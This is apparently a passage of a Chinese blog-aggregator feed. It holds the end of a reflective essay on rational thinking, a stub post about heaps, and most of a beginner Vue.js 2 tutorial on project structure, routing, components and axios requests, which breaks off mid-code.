1+1=3，这是数学。物理、化学等其他自然科学的原理，乃至经济学原理，都不能被修饰。</p><p>也许思考，就是要从自然科学立足吧？</p><p>就比如从数学逻辑里延申——任何事情都是有逻辑的，都应有前因后果。当一件事发生时，也许周围人都会讲述“这件事发生了”，可却鲜有人追溯，这件事为什么发生？当全社会都在为这件事痴狂，乃至要将这件事作为“原因”，采取行动（产生新的“结果”）时，还是没有多少人去关注这件事的根本原因、历史原因、直接原因之间的关系。然后，绝大多数人都被鼓动起来了，就像四年前的我，去笑6老师……</p><p>观察身边的各种变化，各种自然环境社会环境的变化，各种让人开心或难受或鄙夷的事，去思考，“为什么会这样？”</p><p>也许这就是所谓“理性”？</p><p>我不知道几百年前欧洲启蒙运动提倡的“理性”是否就是为了解决这样的问题。</p><p>“要思考，学会思考！”</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/05/find-minn-with-heap/</id>
        <title><![CDATA[用堆找出最小的 N 个数]]></title>
        <updated>2019-05-21T08:46:12+08:00</updated>
        <link href="https://blog.stdioa.com/2019/05/find-minn-with-heap/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/05/find-minn-with-heap/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (中国标准时间) --><p>不知道为啥，突然想水一篇很水的算法文章。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js 从入坑到入土]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-从入坑到入土">Vue.js 从入坑到入土</h1>
<p>近年来前端领域发展飞速，从最早的直接写html, js, css 到使用jQuery快速开发，再到近年来使用Vuejs，Reactjs 实现工程化开发，也就短短十几年。虽然前端项目结构越来越复杂，但也越来越规范，清晰，更加工程化。当前较为流行的前端框架有Vuejs、Reactjs、Angularjs 等，而Vuejs由于其灵(zhong)活(wen)轻(wen)便(dang)，较为流行。虽然Vuejs有完善的中文文档，但文档主要在介绍其用法，缺少如何实现一个完整项目的指导，本文就介绍如何用Vuejs创建一个完整的前端项目，并与后端进行交互。</p>
<p><strong>本文基于<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>及<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>所需技术栈：html, javascript, css基础知识，其中js建议了解<strong>ES2015</strong>标准，特别要掌握<strong>promise</strong>的使用</li>
<li>使用的工具：<del>宇宙第一编辑器</del> VSCode —— 现在对vue项目的支持已经很好了，可以自动安装vue项目需要的插件</li>
</ol>
<h1 id="0x0-安装">0x0 安装</h1>
<blockquote>
<p>推荐使用<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>代替npm作为包管理器</p>
</blockquote>
<h2 id="安装vuecli">安装VueCLI</h2>
<blockquote>
<p>VueCLI是Vuejs官方推出的项目脚手架工具，可以方便的创建、管理Vue项目，还提供优雅的web管理界面</p>
</blockquote>
<p>全局安装<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="安装vue-devtools">安装Vue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> 是vue官方的浏览器开发插件，可以方便的在浏览器中调试vue应用</p>
</blockquote>
<p>Vue-devtools 提供多平台的浏览器插件可以直接安装使用</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-新建项目">0x1 新建项目</h1>
<p>使用 <code>vue create vue_demo</code> 创建新项目，接下来会出现一个交互式命令行帮你配置项目。</p>
<p><strong>注意此处不要使用默认的配置！具体配置参考下图</strong></p>
<blockquote>
<p>坑x1 默认的配置十分简单，新手经常不知道怎么写多页面，弄不明白项目怎么组织的，所以需要自定义配置，添加vue-router插件实现多页面跳转</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-项目框架">0x2 项目框架</h1>
<p>此时项目已经创建成功，如果你按照提示启动项目就能看到经典的vue启动页</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>当前的项目结构如下</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     项目根目录
├── README.md 
├── babel.config.js
├── package.json      项目主配置文件
├── public            公共资源文件夹
│   ├── favicon.ico
│   └── index.html    入口html
├── src               源码根目录
│   ├── App.vue       入口文件
│   ├── assets        资源文件夹
│   │   └── logo.png
│   ├── components    组件文件夹
│   │   └── HelloWorld.vue 
│   ├── main.js       入口配置文件
│   ├── router.js     路由文件
│   ├── store.js      状态管理
│   └── views         页面文件夹
│       ├── About.vue
│       └── Home.vue
└── yarn.lock         依赖文件
</code></pre></div><p>在下面的章节具体介绍各个文件、文件夹的用处和如何组织项目。</p>
<h1 id="0x3-项目结构">0x3 项目结构</h1>
<p>用vue开发的项目一般是<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(单页应用)</a>，通过动态重写当前页面来与用户交互，而不会重新加载整个新页面。所以要组织多页面就要通过vue-router来组织页面，而vuex用来保存状态。</p>
<p>作为单页应用，当然需要一个入口html文件，也就是 <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>这是默认生成的 <code>index.html</code> ，而编译好的文件（网页内容）会被自动注入到 `` 中，也就意味着要使用vue开发的应用，浏览器必须支持js。</p>
<p>而#app所绑定的vue实例，则位于 <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// 使用vue-router插件
</span><span class="c1"></span>  <span class="nx">store</span><span class="p">,</span> <span class="c1">// 使用vuex插件
</span><span class="c1"></span>  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">)</span> <span class="c1">// 渲染页面
</span><span class="c1"></span><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span> <span class="c1">// 绑定到 index.html -&gt; div#app
</span></code></pre></div><p>其中渲染的页面位于 <code>src/App.vue</code></p>
<hr>
<blockquote>
<p>xxx.vue 是vue中的<a href="https://cn.vuejs.org/v2/guide/single-file-components.html">单文件组件</a>，将 <code>html css javascript</code> 集合在同一个文件，便于组织管理</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/App.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;nav&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/&#34;</span><span class="p">&gt;</span>Home<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">to</span><span class="o">=</span><span class="s">&#34;/about&#34;</span><span class="p">&gt;</span>About<span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">router-view</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">app</span> <span class="p">{</span>
  <span class="k">font-family</span><span class="p">:</span> <span class="s1">&#39;Avenir&#39;</span><span class="p">,</span> <span class="n">Helvetica</span><span class="p">,</span> <span class="n">Arial</span><span class="p">,</span> <span class="kc">sans-serif</span><span class="p">;</span>
  <span class="kp">-webkit-</span><span class="n">font-smoothing</span><span class="p">:</span> <span class="n">antialiased</span><span class="p">;</span>
  <span class="kp">-moz-</span><span class="n">osx-font-smoothing</span><span class="p">:</span> <span class="n">grayscale</span><span class="p">;</span>
  <span class="k">text-align</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="p">{</span>
  <span class="k">padding</span><span class="p">:</span> <span class="mi">30</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span> <span class="p">{</span>
  <span class="k">font-weight</span><span class="p">:</span> <span class="kc">bold</span><span class="p">;</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#2c3e50</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">#</span><span class="nn">nav</span> <span class="nt">a</span><span class="p">.</span><span class="nc">router-link-exact-active</span> <span class="p">{</span>
  <span class="k">color</span><span class="p">:</span> <span class="mh">#42b983</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>其中 <code>是页面的 `html` 元素，`style` 是样式元素，还可以添加一个 `javascript` 为js元素。其中</code> 是路由组件，会被自动渲染成当前路由对应的页面</p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">router</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Router</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>
<span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;./views/Home.vue&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Router</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Router</span><span class="p">({</span>
  <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;history&#39;</span><span class="p">,</span>
  <span class="nx">base</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE_URL</span><span class="p">,</span>
  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
      <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;about&#39;</span><span class="p">,</span>
      <span class="c1">// route level code-splitting
</span><span class="c1"></span>      <span class="c1">// this generates a separate chunk (about.[hash].js) for this route
</span><span class="c1"></span>      <span class="c1">// which is lazy-loaded when the route is visited.
</span><span class="c1"></span>      <span class="nx">component</span><span class="o">:</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="kr">import</span><span class="p">(</span><span class="cm">/* webpackChunkName: &#34;about&#34; */</span> <span class="s1">&#39;./views/About.vue&#39;</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">})</span>
</code></pre></div><p>如 <code>http://localhost:8080/</code> 下 <code>被渲染成 `home` 页面，`http://localhost:8080/about` 下</code> 被渲染成 <code>about</code> 页面。</p>
<blockquote>
<p>技巧 这里加载组件使用函数加载，就可以实现懒加载以优化性能。</p>
</blockquote>
<hr>
<p><code>src/views/</code> 则是保存页面文件，例如</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/views/Home.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;home&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;Vue logo&#34;</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../assets/logo.png&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">HelloWorld</span> <span class="na">msg</span><span class="o">=</span><span class="s">&#34;Welcome to Your Vue.js App&#34;</span><span class="p">/&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c1">// @ is an alias to /src
</span><span class="c1"></span><span class="kr">import</span> <span class="nx">HelloWorld</span> <span class="nx">from</span> <span class="s1">&#39;@/components/HelloWorld.vue&#39;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span>
  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">HelloWorld</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div><p>这就是路由 <code>home</code> 对应的页面，其中用到了 <code>HelloWorld</code> 组件，需要在js中引入。</p>
<hr>
<p><code>src/components/</code> 里面保存可复用的组件，例如上面的 `` 就是一个独立的组件（component）</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/HelloWorld.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;hello&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{ msg }}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
      For a guide and recipes on how to configure / customize this project,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
      check out the
      <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;https://cli.vuejs.org&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;_blank&#34;</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;noopener&#34;</span><span class="p">&gt;</span>vue-cli documentation<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;HelloWorld&#39;</span><span class="p">,</span>
  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">msg</span><span class="o">:</span> <span class="nb">String</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="c">&lt;!-- Add &#34;scoped&#34; attribute to limit CSS to this component only --&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="nt">h1</span> <span class="p">{</span>
  <span class="k">margin</span><span class="p">:</span> <span class="mi">40</span><span class="kt">px</span> <span class="mi">0</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>这就是一个典型的组件，结构就是一个正常的单文本组件，说明组件就是把一部分页面逻辑抽出来组成一个文件。这样的好处是分离与页面无关的组件，使页面逻辑更加清晰，同时也便于复用组件。如果有以下情况，我建议把部分代码分离成独立的组件：</p>
<ol>
<li>需要多次复用的组件，如基础按钮、表单等</li>
<li>较为复杂但与页面逻辑无关的，如页面的Header、Footer等</li>
</ol>
<blockquote>
<p>技巧 在 <code>style</code> 表情上添加 <code>scoped</code> 属性可以限制CSS生效范围为该组件，不会影响其他元素，在编译时vue解释器会给这些css属性加上随机的hash保证唯一</p>
</blockquote>
<hr>
<p>vue还提供了一个状态管理模式 <a href="https://vuex.vuejs.org/zh/">vuex</a>，可以很方便的管理所有组件的状态。对应文件 <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>由于我还没用过 <code>vuex</code> 所以自己看文档吧</del></p>
<p>对于简单的应用也可以不用 <code>vuex</code> ，一个简单的 <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> 模式</a> 就足够了</p>
<h1 id="0x4-开发指引">0x4 开发指引</h1>
<p>有了上面的基础，我们就可以开始写代码了，这里以添加一个 <code>Foo</code> 页面展示从远端获得的数据为例</p>
<h2 id="1-给页面添加一个-tab">1. 给页面添加一个 <code>Tab</code></h2>
<p><code>Tab</code> 属于与页面逻辑无关，但又处处要使用的元素，所以我们将其独立成为一个组件</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>在这里我们创建了一个底部导航栏，有三个 <code>Tab</code> ，并且对应跳转到不同的页面</p>
<h2 id="2-创建-foovue-相关逻辑并与后端交互">2. 创建 <code>Foo.vue</code> 相关逻辑并与后端交互</h2>
<p>因为我们需要从远端API获取数据并进行展示，就涉及网络请求。在vue中，官方推荐使用 <a href="https://github.com/axios/axios">axios</a> 发起请求。<code>axios</code> 是一个基于 <code>promise</code> 的异步网络请求库，相关用法可参考文档或网上教程</p>
<p>安装 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>接着在 <code>src/main.js</code> 中加入以下语句启用 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// 把axios添加到原型链
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>现在就可以在vue实例中用 <code>this.$router</code> 来访问路由了</p>
<hr>
<p>接着来创建 <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
